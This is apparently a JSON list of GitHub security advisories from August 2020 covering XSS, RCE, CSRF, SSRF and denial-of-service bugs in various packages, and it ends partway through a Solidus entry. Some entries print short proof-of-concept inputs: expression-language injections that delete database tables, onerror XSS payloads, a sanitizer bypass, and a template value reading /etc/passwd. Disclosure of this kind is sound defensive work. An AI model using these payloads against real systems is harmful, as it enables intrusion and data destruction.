[
  {
    "ghsaId": "GHSA-hrpq-r399-whgw",
    "publishedAt": "2020-08-25T23:40:53Z",
    "description": "This affects all versions of package safe-eval. It is possible for an attacker to run an arbitrary command on the host machine.",
    "summary": "Sandbox Escape in safe-eval"
  },
  {
    "ghsaId": "GHSA-gr4j-r575-g665",
    "publishedAt": "2020-08-25T14:04:47Z",
    "description": "Versions of `highcharts` prior to 7.2.2 or 8.1.1 are vulnerable to Cross-Site Scripting (XSS).  The package fails to sanitize `href` values and does not restrict URL schemes, allowing attackers to execute arbitrary JavaScript in a victim's browser if they click the link.",
    "summary": "Cross-Site Scripting in highcharts"
  },
  {
    "ghsaId": "GHSA-7257-96vg-qf6x",
    "publishedAt": "2020-08-21T17:03:24Z",
    "description": "### Impact\nA RCE exploit has been discovered in the Streams module: this exploit allows Discord users with specifically crafted \"going live\" messages to inject code into the Streams module's going live message. By abusing this exploit, it's possible to perform destructive actions and/or access sensitive information.\n\n### Patches\nThis critical exploit has been fixed on version ``3.3.12`` & ``3.4``.\n\n### Workarounds\nUnloading the Streams module with ``unload streams`` can render this exploit not accessible. We still highly recommend updating to ``3.3.12`` or ``3.4`` to completely patch this issue.\n\n### References\n* https://github.com/Cog-Creators/Red-DiscordBot/pull/4183\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Cog-Creators/Red-DiscordBot](https://github.com/Cog-Creators/Red-DiscordBot)\n* Over on our [Discord server](https://discord.gg/red)",
    "summary": "Remote Code Execution in Red Discord Bot"
  },
  {
    "ghsaId": "GHSA-55j9-849x-26h4",
    "publishedAt": "2020-08-21T16:30:52Z",
    "description": "### Impact\nA RCE exploit has been discovered in the Trivia module: this exploit allows Discord users with specifically crafted usernames to inject code into the Trivia module's leaderboard command. By abusing this exploit, it's possible to perform destructive actions and/or access sensitive information.\n\n### Patches\nThis critical exploit has been fixed on version 3.3.11.\n\n### Workarounds\nUnloading the Trivia module with ``unload trivia`` can render this exploit not accessible. We still highly recommend updating to 3.3.11 to completely patch this issue.\n\n### References\nhttps://github.com/Cog-Creators/Red-DiscordBot/pull/4175\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Cog-Creators/Red-DiscordBot](https://github.com/Cog-Creators/Red-DiscordBot)\n* Over on our [Discord server](https://discord.gg/red)",
    "summary": "Remote Code Execution in Red Discord Bot"
  },
  {
    "ghsaId": "GHSA-2828-9vh6-9m6j",
    "publishedAt": "2020-08-21T16:25:48Z",
    "description": "### Impact\nAn attacker who can gain file access to the repository and modify metadata files may cause a denial of service to clients by creating many invalid signatures on a metadata file. Having a large number of signatures to verify will delay the moment when the client will determine the signature is not valid. This delay may be for at least a few minutes, but possibly could be longer especially if multiple files are impacted.\n\nThe tuf maintainers would like to thank Erik MacLean of Analog Devices, Inc. for reporting this issue.\n\n### Patches\nNo fix exists for this issue. \n\n### Workarounds\nNo workarounds are known for this issue.\n\n### References\n* [CVE-2020-6173](https://nvd.nist.gov/vuln/detail/CVE-2020-6173)\n* [Issue #973](https://github.com/theupdateframework/tuf/issues/973)",
    "summary": "Client Denial of Service on TUF"
  },
  {
    "ghsaId": "GHSA-pwqf-9h7j-7mv8",
    "publishedAt": "2020-08-21T16:25:26Z",
    "description": "### Impact\nMetadadata signature verification, as used in `tuf.client.updater`, counted each of multiple signatures with identical authorized keyids  separately towards the threshold. Therefore, an attacker with access to a valid signing key could create multiple valid signatures in order to meet the minimum threshold of keys before the metadata was considered valid.\n\nThe tuf maintainers would like to thank Erik MacLean of Analog Devices, Inc. for reporting this issue.\n\n### Patches\nA [fix](https://github.com/theupdateframework/tuf/pull/974) is available in version [0.12.2](https://github.com/theupdateframework/tuf/releases/tag/v0.12.2) or newer.\n\n### Workarounds\nNo workarounds are known for this issue.\n\n### References\n* [CVE-2020-6174](https://nvd.nist.gov/vuln/detail/CVE-2020-6174)\n* Pull request resolving the issue [PR 974](https://github.com/theupdateframework/tuf/pull/974)",
    "summary": "Incorrect threshold signature computation in TUF"
  },
  {
    "ghsaId": "GHSA-5wg4-74h6-q47v",
    "publishedAt": "2020-08-20T14:38:49Z",
    "description": "In bcrypt (npm package) before version 5.0.0, data is truncated wrong when its length is greater than 255 bytes.",
    "summary": "Inadequate Encryption Strength in bcrypt"
  },
  {
    "ghsaId": "GHSA-9x4c-63pf-525f",
    "publishedAt": "2020-08-20T14:38:24Z",
    "description": "### Impact\nClients generated with a maliciously crafted OpenAPI Document can generate arbitrary Python code. Subsequent execution of this malicious client is arbitrary code execution.\n\nGiving this a CVSS of 8.0 (high) with CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H/E:P/RL:U/RC:C .\n\n### Patches\nFix will be included in version 0.5.3\n\n### Workarounds\nInspect OpenAPI documents before generating, or inspect generated code before executing.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [openapi-python-client](https://github.com/triaxtec/openapi-python-client/issues)\n* Email us at [danthony@triaxtec.com](mailto:danthony@triaxtec.com)",
    "summary": "Arbitrary Code Generation"
  },
  {
    "ghsaId": "GHSA-7wgr-7666-7pwj",
    "publishedAt": "2020-08-20T14:38:13Z",
    "description": "### Impact\nPath traversal vulnerability. If a user generated a client using a maliciously crafted OpenAPI document, it is possible for generated files to be placed in arbitrary locations on disk.\n\nGiving this a CVSS score of 3.0 (Low) with CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N/E:P/RL:U/RC:C\n\n### Patches\nA fix is being worked on for version 0.5.3\n\n### Workarounds\nInspect OpenAPI documents before generating clients for them.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [openapi-python-client](https://github.com/triaxtec/openapi-python-client/issues)\n* Email us at [danthony@triaxtec.com](mailto:danthony@triaxtec.com)",
    "summary": "Path Traversal in openapi-python-client"
  },
  {
    "ghsaId": "GHSA-6gg3-pmm7-97xc",
    "publishedAt": "2020-08-19T21:05:03Z",
    "description": "### Overview\nVersions before and including `11.25.1` are using `dangerouslySetInnerHTML` to display an informational message when used with a Passwordless or Enterprise connection.\n\n- For Passwordless connection, the value of the input (email or phone number) is displayed back to the user while waiting for verification code input.  \n- For Enterprise connection, the value of the input (IdP Domain) from the Enterprise connection setup screen (Auth0 Dashboard) is displayed back to the user when the `lock` widget opens.\n\nWhen Passwordless or Enterprise connection is used, the application and its users might be exposed to cross-site scripting (XSS) attacks.\n\n### Am I affected?\nYou are affected by this vulnerability if all of the following conditions apply:\n\n- You are using auth0-lock\n- You are using Passwordless or Enterprise connection mode\n\n### How to fix that?\nUpgrade to version `11.26.3`\n\n### Will this update impact my users?\nThe fix provided in patch will not affect your users.\n\n### Credit\nhttps://github.com/mvisat",
    "summary": "DOM-based XSS in auth0-lock"
  },
  {
    "ghsaId": "GHSA-p4pj-9g59-4ppv",
    "publishedAt": "2020-08-19T21:04:25Z",
    "description": "### Impact\n\nRequest parameters injected inside an expression evaluated by `symfony/expression-language` package haven't been sanitized properly. This allows the attacker to access any public service by manipulating that request parameter, allowing for Remote Code Execution.\n\nThe vulnerable versions include: `<=1.3.13 || >=1.4.0 <=1.4.6 || >=1.5.0 <=1.5.1 || >=1.6.0 <=1.6.3`.\n\n### Example\n\n```yaml\nfoo:\n    path: /foo/{id}\n    defaults:\n        _sylius:\n            repository:\n                method: findSome\n                arguments:\n                    entity: \"expr:service('repository').find($id)\"\n```\n\nIn this case, `$id` can be prepared in a way that calls other services. \n\nIf you visit `/foo/\"~service('doctrine').getManager().getConnection().executeQuery(\"DELETE * FROM TABLE\")~\"`, it will result in a following expression `expr:service('repository').find(\"\"~service('doctrine').getManager().getConnection().executeQuery(\"DELETE * FROM TABLE\")~\"\")`, which will execute a query on the currently connected database.\n\nTo find a vulnerability in your application, look for any routing definition that uses request parameters inside expression language.\n\n### Patches\n\nThis issue has been patched for versions 1.3.14, 1.4.7, 1.5.2 and 1.6.4. Versions prior to 1.3 were not patched.\n\n### Workarounds\n\nThe fix requires adding `addslashes` in `ParametersParser::parseRequestValueExpression` to sanitize user input before evaluating it using the expression language.\n\n```php\n- return is_string($variable) ? sprintf('\"%s\"', $variable) : $variable;\n+ return is_string($variable) ? sprintf('\"%s\"', addslashes($variable)) : $variable;\n```\n\n### Acknowledgements\n\nThis security issue has been reported by Craig Blanchette (@isometriks), thanks a lot!\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email us at [security@sylius.com](mailto:security@sylius.com)",
    "summary": "Remote Code Execution in SyliusResourceBundle"
  },
  {
    "ghsaId": "GHSA-h6m7-j4h3-9rf5",
    "publishedAt": "2020-08-19T19:52:30Z",
    "description": "### Impact\n\nRequest parameters injected inside an expression evaluated by `symfony/expression-language` package haven't been sanitized properly. This allows the attacker to access any public service by manipulating that request parameter, allowing for Remote Code Execution.\n\nThe vulnerable versions include: `<=1.3.13 || >=1.4.0 <=1.4.6 || >=1.5.0 <=1.5.1 || >=1.6.0 <=1.6.3`.\n\n### Example\n\n```yaml\nsylius_grid:\n    grids:\n        foo:\n            fields:\n                bar:\n                    options:\n                        baz: \"expr:service('sylius.repository.product').find($id)\"\n```\n\nIn this case, `$id` can be prepared in a way that calls other services. \n\nIf you visit `/route?id=\"~service('doctrine').getManager().getConnection().executeQuery(\"DELETE * FROM TABLE\")~\"`, it will result in a following expression `expr:service('repository').find(\"\"~service('doctrine').getManager().getConnection().executeQuery(\"DELETE * FROM TABLE\")~\"\")`, which will execute a query on the currently connected database.\n\nTo find a vulnerability in your application, look for any routing definition that uses request parameters inside expression language.\n\n### Patches\n\nThis issue has been patched for versions 1.3.14, 1.4.7, 1.5.2 and 1.6.4. Versions prior to 1.3 were not patched.\n\n### Workarounds\n\nThe fix requires adding `addslashes` in `OptionsParser::parseOptionExpression` to sanitize user input before evaluating it using the expression language.\n\n```php\n- return is_string($variable) ? sprintf('\"%s\"', $variable) : $variable;\n+ return is_string($variable) ? sprintf('\"%s\"', addslashes($variable)) : $variable;\n```\n\n### Acknowledgements\n\nThis security issue has been reported by Craig Blanchette (@isometriks), thanks a lot!\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email us at [security@sylius.com](mailto:security@sylius.com)",
    "summary": "Remote Code Execution in SyliusResourceBundle"
  },
  {
    "ghsaId": "GHSA-crf2-xm6x-46p6",
    "publishedAt": "2020-08-19T18:02:36Z",
    "description": "### Impact\nThis vulnerability allows to circumvent the **formkey protection** in the Admin Interface and increases the attack surface for  **Cross Site Request Forgery** attacks \n\n### Patches\nThe latest OpenMage Versions up from 19.4.6 and 20.0.2 have this Issue solved\n\n\n### References\nRelated to Adobes CVE-2020-9690 ( https://helpx.adobe.com/security/products/magento/apsb20-47.html )\nfixed in Magento2 https://github.com/magento/magento2/commit/52d72b8010c9cecb5b8e3d98ec5edc1ddcc65fb4\nas part of 2.4.0/2.3.5-p2",
    "summary": "Observable Timing Discrepancy in OpenMage LTS"
  },
  {
    "ghsaId": "GHSA-f93j-hmcr-jcwh",
    "publishedAt": "2020-08-19T16:45:49Z",
    "description": "The Moped::BSON::ObjecId.legal? method in rubygem-moped before commit dd5a7c14b5d2e466f7875d079af71ad19774609b allows remote attackers to cause a denial of service (worker resource consumption) or perform a cross-site scripting (XSS) attack via a crafted string.",
    "summary": "Data Injection Vulnerability in moped Rubygem"
  },
  {
    "ghsaId": "GHSA-cf8j-64h9-6q58",
    "publishedAt": "2020-08-18T17:30:25Z",
    "description": "In Play Framework 2.6.0 through 2.8.1, the CSRF filter can be bypassed by making CORS simple requests with content types that contain parameters that can't be parsed.",
    "summary": "CSRF in Play Framework"
  },
  {
    "ghsaId": "GHSA-jw37-5gqr-cf9j",
    "publishedAt": "2020-08-17T21:44:54Z",
    "description": "### Impact\n\n`ftp-srv` from **v1.0.0** onward to **v4.3.3**.\n\n### Background\n\nThe FTP protocol creates two connections, one for commands and one for transferring data.\nThis second data connection can be created in two ways, on the server by sending the PASV command, or on the client by sending the PORT command.\n\nThe PORT command sends the IP and port for the server to connect to the client with.\n\n### Issue\nSince the client can send an arbitrary IP with the PORT command, this can be used to cause the server to make a connection elsewhere.\n\n### Patches\n\n* _fix: disallow PORT connections to alternate hosts_: e449e75219d918c400dec65b4b0759f60476abca\n\nDeprecation notices have been published for older versions.\n\n### Workarounds\n\nBlacklisting the FTP Command `PORT` will prevent the server from exposing this behaviour through active connections until a fix is applied.\n```js\nconst ftp = new FtpSrv({\n  blacklist: ['PORT']\n});\n```\n\n### References\nhttps://www.npmjs.com/advisories/1445\n\n### Credits\n\nThank you to;\n@trs for fixing it\n@andreeleuterio for reporting it to us for an anonymous user (Vincent) through the NPM platform\n@quiquelhappy for bringing it to our attention after it slipped through the cracks during Christmas\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue at [https://github.com/autovance/ftp-srv](https://github.com/autovance/ftp-srv)\n* Email us directly; matt@autovance.com, tyler@autovance.com",
    "summary": "Server-Side Request Forgery in ftp-srv"
  },
  {
    "ghsaId": "GHSA-9m4x-8w29-r78g",
    "publishedAt": "2020-08-13T18:54:19Z",
    "description": "The @uppy/companion npm package before versions 1.13.2 and 2.0.0-alpha.5 is vulnerable to a Server-Side Request Forgery (SSRF) vulnerability, which allows an attacker to scan local or external networks or otherwise interact with internal systems.",
    "summary": "Server-Side Request Forgery in @uppy/companion"
  },
  {
    "ghsaId": "GHSA-3j95-fjv2-3m4p",
    "publishedAt": "2020-08-12T14:29:15Z",
    "description": "The Chartkick gem through 3.3.2 for Ruby allows Cascading Style Sheets (CSS) Injection (without attribute).",
    "summary": "CSS Injection in Chartkick gem"
  },
  {
    "ghsaId": "GHSA-j7wp-vjj6-cp5m",
    "publishedAt": "2020-08-11T19:40:10Z",
    "description": "Kendo UI for Angular Editor Component (npm package @progress/kendo-angular-editor) before version 1.2.3 is vulnerable to Cross-Site Scripting. When the Editor content contains potentially malicious scripts in element event handlers, they get executed.\nAdding the following content to the Editor value demonstrates the issue: `<img src=\"\" onerror=alert(document.domain)>`.",
    "summary": "Cross-Site Scripting in @progress/kendo-angular-editor"
  },
  {
    "ghsaId": "GHSA-hxcc-f52p-wc94",
    "publishedAt": "2020-08-11T17:21:13Z",
    "description": "serialize-javascript prior to 3.1.0 allows remote attackers to inject arbitrary code via the function \"deleteFunctions\" within \"index.js\". \r\n\r\nAn object such as `{\"foo\": /1\"/, \"bar\": \"a\\\"@__R-<UID>-0__@\"}` was serialized as `{\"foo\": /1\"/, \"bar\": \"a\\/1\"/}`, which allows an attacker to escape the `bar` key. This requires the attacker to control the values of both `foo` and `bar` and guess the value of `<UID>`. The UID has a keyspace of approximately 4 billion making it a realistic network attack.\r\n\r\nThe following proof-of-concept calls `console.log()` when the running `eval()`:\r\n`eval('('+ serialize({\"foo\": /1\" + console.log(1)/i, \"bar\": '\"@__R-<UID>-0__@'}) + ')');`",
    "summary": "Insecure serialization leading to RCE in serialize-javascript"
  },
  {
    "ghsaId": "GHSA-vrv8-v4w8-f95h",
    "publishedAt": "2020-08-11T14:55:01Z",
    "description": "### Impact\nA cross-site scripting (XSS) vulnerability was discovered in the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor via the clipboard or APIs. This impacts all users who are using TinyMCE 4.9.10 or lower and TinyMCE 5.4.0 or lower.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 4.9.11 and 5.4.1 by improved HTML parsing and sanitization logic.\n\n### Workarounds\nThe workarounds available are:\n- upgrade to either TinyMCE 4.9.11 or TinyMCE 5.4.1\nor\n- enable the media plugin, which overrides the default parsing behaviour for iframes\nor\n- add the following workaround to update the parsing schema rules for iframes:\n\n#### Example: Change the default schema for iframes\n```js\nsetup: function(editor) {\n  editor.on('PreInit', function() {\n    editor.schema.getSpecialElements()['iframe'] = /</iframe[^>]*>/gi;\n  });\n}\n```\n\n### Acknowledgements\nTiny Technologies would like to thank George Steketee and Chris Davis at [Bishop Fox](https://www.bishopfox.com/) for discovering this vulnerability.\n\n### References\nhttps://www.tiny.cloud/docs/release-notes/release-notes54/#securityfixes\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)\n* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",
    "summary": "Cross-site scripting vulnerability in TinyMCE"
  },
  {
    "ghsaId": "GHSA-q6j3-c4wc-63vw",
    "publishedAt": "2020-08-11T14:54:40Z",
    "description": "### Impact\n\nThe HTML form for a read-only canned query includes the hidden CSRF token field added in #798 for writable canned queries (#698).\n\nThis means that submitting those read-only forms exposes the CSRF token in the URL - for example on https://latest.datasette.io/fixtures/neighborhood_search submitting the form took me to:\n\nhttps://latest.datasette.io/fixtures/neighborhood_search?text=down&csrftoken=CSRFTOKEN-HERE\n\nThis token could potentially leak to an attacker if the resulting page has a link to an external site on it and the user clicks the link, since the token would be exposed in the referral logs.\n\n### Patches\n\nA fix for this issue has been released in Datasette 0.46.\n\n### Workarounds\n\nYou can fix this issue in a Datasette instance without upgrading by copying the [0.46 query.html template](https://raw.githubusercontent.com/simonw/datasette/0.46/datasette/templates/query.html) into a custom `templates/` directory and running Datasette with the `--template-dir=templates/` option.\n\n### References\n\nIssue 918 discusses this in details: https://github.com/simonw/datasette/issues/918\n\n### For more information\n\nContact swillison at gmail with any questions.",
    "summary": "CSRF tokens leaked in URL by canned query form"
  },
  {
    "ghsaId": "GHSA-wvhm-4hhf-97x9",
    "publishedAt": "2020-08-07T22:28:30Z",
    "description": "### Impact\nThe easing preview of the Previewers plugin has an XSS vulnerability that allows attackers to execute arbitrary code in Safari and Internet Explorer.\n\nThis impacts all Safari and Internet Explorer users of Prism >=v1.1.0 that use the _Previewers_ plugin (>=v1.10.0) or the _Previewer: Easing_ plugin (v1.1.0 to v1.9.0).\n\n### Patches\nThis problem is patched in v1.21.0.\n\n### Workarounds\nTo workaround the issue without upgrading, [disable the easing preview](https://prismjs.com/plugins/previewers/#disabling-a-previewer) on all impacted code blocks. You need Prism v1.10.0 or newer to apply this workaround.\n\n### References\nThe vulnerability was introduced by this [commit](https://github.com/PrismJS/prism/commit/4303c940d3d3a20e8ce7635bf23331c75060f5c5) on Sep 29, 2015 and fixed by [Masato Kinugawa](https://twitter.com/kinugawamasato) (#2506).\n\n### For more information\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/PrismJS/prism/issues).",
    "summary": "Cross-Site Scripting in Prism"
  },
  {
    "ghsaId": "GHSA-mqm2-cgpr-p4m6",
    "publishedAt": "2020-08-07T22:27:41Z",
    "description": "The kramdown gem before 2.3.0 for Ruby processes the template option inside Kramdown documents by default, which allows unintended read access (such as template=\"/etc/passwd\") or unintended embedded Ruby code execution (such as a string that begins with template=\"string://<%= `). NOTE: kramdown is used in Jekyll, GitLab Pages, GitHub Pages, and Thredded Forum.",
    "summary": "Unintended read access in kramdown gem"
  },
  {
    "ghsaId": "GHSA-5cp4-xmrw-59wf",
    "publishedAt": "2020-08-05T21:47:02Z",
    "description": "### Summary\nXSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to `JQLite` methods like `JQLite.prepend`, `JQLite.after`, `JQLite.append`, `JQLite.replaceWith`, `JQLite.append`, `new JQLite` and `angular.element`.\n\n### Description\n\nJQLite (DOM manipulation library that's part of AngularJS) manipulates input HTML before inserting it to the DOM in `jqLiteBuildFragment`.\n\nOne of the modifications performed [expands an XHTML self-closing tag](https://github.com/angular/angular.js/blob/418355f1cf9a9a9827ae81d257966e6acfb5623a/src/jqLite.js#L218).\n\nIf `jqLiteBuildFragment` is called (e.g. via `new JQLite(aString)`) with user-controlled HTML string that was sanitized (e.g. with [DOMPurify](https://github.com/cure53/DOMPurify)), the transformation done by JQLite may modify some forms of an inert, sanitized payload into a payload containing JavaScript - and trigger an XSS when the payload is inserted into DOM.\n\nThis is similar to a bug in jQuery `htmlPrefilter` function that was [fixed in 3.5.0](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/).\n\n### Proof of concept\n\n```javascript\nconst inertPayload = `<div><style><style/><img src=x onerror=\"alert(1337)\"/>` \n```\nNote that the style element is not closed and `<img` would be a text node inside the style if inserted into the DOM as-is.\nAs such, some HTML sanitizers would leave the `<img` as is without processing it and stripping the `onerror` attribute.\n\n```javascript\nangular.element(document).append(inertPayload);\n```\nThis will alert, as `<style/>` will be replaced with `<style></style>` before adding it to the DOM, closing the style element early and reactivating `img`.\n\n### Patches\nThe issue is patched in `JQLite` bundled with angular 1.8.0. AngularJS users using JQuery should upgrade JQuery to 3.5.0, as a similar vulnerability [affects jQuery <3.5.0](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2).\n\n### Workarounds\nChanging sanitizer configuration not to allow certain tag grouping (e.g. `<option><style></option>`) or inline style elements may stop certain exploitation vectors, but it's uncertain if all possible exploitation vectors would be covered. Upgrade of AngularJS to 1.8.0 is recommended.",
    "summary": "XSS via JQLite DOM manipulation functions in AngularJS"
  },
  {
    "ghsaId": "GHSA-whrh-9j4q-g7ph",
    "publishedAt": "2020-08-05T21:43:19Z",
    "description": "### Impact\r\nCSRF vulnerability:\r\nIn some very specific circumstances, an attacker would be able to update your settings.\r\nBasically you would need to navigate to hackersite.com while logged into our panel. Then they could modify your settings. They couldn't check if it worked, nor could they read your settings.\r\n\r\n### Patches\r\nAs of v1.1.1 this has been patched by implementing the Double submit pattern using a cookie.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [Polaris-React](https://github.com/polaris-rbx/polaris-react)\r\n* Email us at [hi@nezto.re](mailto:hi@nezto.re)\r\n* Join our discord (preferred): https://discord.gg/QevWabU",
    "summary": "CSRF Vulnerability in polaris-website"
  },
  {
    "ghsaId": "GHSA-wfm4-pq59-wg6r",
    "publishedAt": "2020-08-05T21:27:44Z",
    "description": "### Impact\n\n_What kind of vulnerability is it? Who is impacted?_\n\nThis vulnerability consists of a few related issues:\n\n#### Forget password leaks information if the user exists\n\nWhen the \"Forget password\" feature on the login screen is used, Sulu asks the user for a username or email address. If the given string is not found, a response with a `400` error code is returned, along with a error message saying that this user name does not exist:\n\n```json\n{\n    \"code\": 0,\n    \"message\": \"Entity with the type \\u0022Sulu\\\\Bundle\\\\SecurityBundle\\\\Entity\\\\User\\u0022 and the id \\u0022asdf\\u0022 not found.\"\n}\n```\n\nThis enables attackers to retrieve valid usernames.\n\n#### Forgot password leaks user email if user exists\n\nThe response of the \"Forgot Password\" request returns the email address to which the email was sent, if the operation was successful:\n\n```json\n{\"email\":\"admin@localhost.local\"}\n```\n\nThis information should not be exposed, as it can be used to gather email addresses.\n\n#### Response time of login gives hint if the username exists\n\nIf the username the user enters in the login screen does not exists, the request responds much faster than if the username exists. This again allows attackers to retrieve valid usernames.\n\n#### Reset Token for Forgot Password feature is not hashed\n\nThe reset token in the user database table is not hashed. That means that somebody could try to request a new password using the Forgot Password feature, and look that up in the database, if the attacker somehow got access to the database. Hashing the reset token would fix that problem.\n\n### Patches\n\nThis problem was fixed in Release 1.6.34, 2.0.10 and 2.1.1.\n\n### Workarounds\n\nOverride the files manually in your project and change them accordingly.",
    "summary": "Reset Password / Login vulnerability in Sulu"
  },
  {
    "ghsaId": "GHSA-v6fx-752r-ccp2",
    "publishedAt": "2020-08-05T14:53:43Z",
    "description": "The PgHero gem through 2.6.0 for Ruby allows CSRF.",
    "summary": "CSRF on PgHero gem"
  },
  {
    "ghsaId": "GHSA-w542-cpp9-r3g7",
    "publishedAt": "2020-08-05T14:53:34Z",
    "description": "The Field Test gem 0.2.0 through 0.3.2 for Ruby allows CSRF.",
    "summary": "CSRF in Field Test"
  },
  {
    "ghsaId": "GHSA-xw5p-hw6r-2j98",
    "publishedAt": "2020-08-05T14:53:22Z",
    "description": "A denial of service vulnerability exists in Fastify v2.14.1 and v3.0.0-rc.4 that allows a malicious user to trigger resource exhaustion (when the allErrors option is used) with specially crafted schemas.",
    "summary": "Denial of service in fastify"
  },
  {
    "ghsaId": "GHSA-9wcg-jrwf-8gg7",
    "publishedAt": "2020-08-05T14:53:16Z",
    "description": "This affects the package express-fileupload before 1.1.8. If the parseNested option is enabled, sending a corrupt HTTP request can lead to denial of service or arbitrary code execution.",
    "summary": "Prototype Pollution in express-fileupload"
  },
  {
    "ghsaId": "GHSA-86qr-9vqc-pgc6",
    "publishedAt": "2020-08-05T14:53:06Z",
    "description": "Spring Integration framework provides Kryo Codec implementations as an alternative for Java (de)serialization. When Kryo is configured with default options, all unregistered classes are resolved on demand. This leads to the \"deserialization gadgets\" exploit when provided data contains malicious code for execution during deserialization. In order to protect against this type of attack, Kryo can be configured to require a set of trusted classes for (de)serialization. Spring Integration should be proactive against blocking unknown \"deserialization gadgets\" when configuring Kryo in code.",
    "summary": "Code execution in Spring Integration"
  },
  {
    "ghsaId": "GHSA-x3rh-m7vp-35f2",
    "publishedAt": "2020-08-05T14:52:59Z",
    "description": "In Eclipse Jetty, versions 9.4.27.v20200227 to 9.4.29.v20200521, in case of too large response headers, Jetty throws an exception to produce an HTTP 431 error. When this happens, the ByteBuffer containing the HTTP response headers is released back to the ByteBufferPool twice. Because of this double release, two threads can acquire the same ByteBuffer from the pool and while thread1 is about to use the ByteBuffer to write response1 data, thread2 fills the ByteBuffer with response2 data. Thread1 then proceeds to write the buffer that now contains response2 data. This results in client1, which issued request1 and expects responses, to see response2 which could contain sensitive data belonging to client2 (HTTP session ids, authentication credentials, etc.).",
    "summary": "Operation on a Resource after Expiration or Release in Jetty Server"
  },
  {
    "ghsaId": "GHSA-55mm-5399-7r63",
    "publishedAt": "2020-08-05T14:52:54Z",
    "description": "### Impact\nPreviously encrypted cookie values were not tied to the name of the cookie the value belonged to. This meant that certain classes of attacks that took advantage of other theoretical vulnerabilities in user facing code (nothing exploitable in the core project itself) had a higher chance of succeeding. \n\nSpecifically, if your usage exposed a way for users to provide unfiltered user input and have it returned to them as an encrypted cookie (ex. storing a user provided search query in a cookie) they could then use the generated cookie in place of other more tightly controlled cookies; or if your usage exposed the plaintext version of an encrypted cookie at any point to the user they could theoretically provide encrypted content from your application back to it as an encrypted cookie and force the framework to decrypt it for them. \n\n### Patches\nIssue has been patched in Build 468 (v1.0.468).\n\n>**NOTE**: If you are using the cookie session driver, all of your session data will be invalidated. All other session drivers should smoothly upgrade to the changes (although the backend authentication persist cookie will also be invalidated requiring users to login again once their current session expires).\n\n### Workarounds\nApply https://github.com/octobercms/library/commit/28310d4fb336a1741b39498f4474497644a6875c to your installation manually if unable to upgrade to Build 468.\n\n### References\n- https://blog.laravel.com/laravel-cookie-security-releases\n- https://github.com/laravel/framework/compare/4c7d118181d6c7f1f883643702df807ced016c5e...a731824421f9ebc586728ea9c7cff231a249aaa9\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat Assessment\nAssessed as Low given that it is not directly exploitable within the core but requires other security vulnerabilities within the application to have an effect and the severity of its effect depends entirely on the severity of those other holes in the application's defences.\n\n### Acknowledgements\n\nThanks to [Takashi Terada of Mitsui Bussan Secure Directions, Inc.](https://www.linkedin.com/in/takeshi-terada-b570a6100/) for finding the original issue in Laravel and @taylorotwell for sharing the report with the October CMS team.",
    "summary": "Reliance on Cookies without validation in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-w4pj-7p68-3vgv",
    "publishedAt": "2020-08-05T14:52:44Z",
    "description": "### Impact\nA user with access to a markdown FormWidget that stores data persistently could create a stored XSS attack against themselves and any other users with access to the generated HTML from the field.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466) & RainLab.Blog v1.4.1 by restricting the ability to store JS in markdown to only users that have been explicitly granted the `backend.allow_unsafe_markdown` permission.\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/9ecfb4867baae14a0d3f99f5b5c1e8a979ae8746 & https://github.com/rainlab/blog-plugin/commit/6ae19a6e16ef3ba730692bc899851342c858bb94 to your installation manually if unable to upgrade to Build 466 or v1.4.1 of RainLab.Blog (if using that plugin).\n\n### References\nReported by [Sivanesh Ashok](https://stazot.com/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1100\" alt=\"Screen Shot 2020-03-31 at 2 01 52 PM\" src=\"https://user-images.githubusercontent.com/7253840/78070158-8f7ef580-7358-11ea-950c-226533f6a0a3.png\">",
    "summary": "Stored XSS in October"
  },
  {
    "ghsaId": "GHSA-3mvg-rrrw-m7ph",
    "publishedAt": "2020-08-04T22:17:57Z",
    "description": "### Impact\n\nThis vulnerability allows a malicious customer to craft request data with parameters that allow changing the address of the current order without changing the shipment costs associated with the new shipment.\n\nAll stores with at least two shipping zones and different costs of shipment per zone are impacted. \n\nE.g.\n1. Store admin configured the store so that there are two zones in US:\n-  East Cost Zone - Shipping Method cost: $1\n- West Cost Zone - Shipping Method cost: $10\n\nThe attacker user can know that shipping to NY is less expensive than to LA just by testing different addresses in checkout.\n\n2. The attacker user enters any NY shipping address in the address step\n3. The attacker user chooses the $1 delivery option\n4. The attacker user crafts a request with their real LA address, similar to:\n\n```\n// POST #checkout/update:\n\n{\n  state: 'payment',\n  order: {\n    ship_address_attributes: {\n      city: 'Los Angeles',\n      ...\n    }\n  }\n}\n```\n5. The attacker user proceeds with checking out with a new address and the $1 shipment costs.\n\nAnother scenario where this could be dangerous is:\n\n> You cannot ship products in some zones and you are relying on Solidus Shipping Method building only to filter out unwanted zones. Malicious users can enter an allowed zone's address and change back to an unwanted one in the payment step by crafting a request with some proper ship_address_attributes.\n\nThis problem comes from how checkout permitted attributes are 